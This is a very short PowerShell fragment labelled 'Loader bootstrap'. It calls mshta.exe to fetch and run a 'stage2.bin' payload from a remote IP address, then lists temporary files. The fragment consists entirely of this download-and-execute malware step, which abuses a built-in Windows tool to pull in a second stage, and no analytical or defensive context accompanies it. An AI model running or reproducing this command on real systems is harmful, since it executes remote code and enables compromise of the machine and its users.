
<# Loader bootstrap #> mshta.exe "http://203.0.113.189/stage2.bin"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
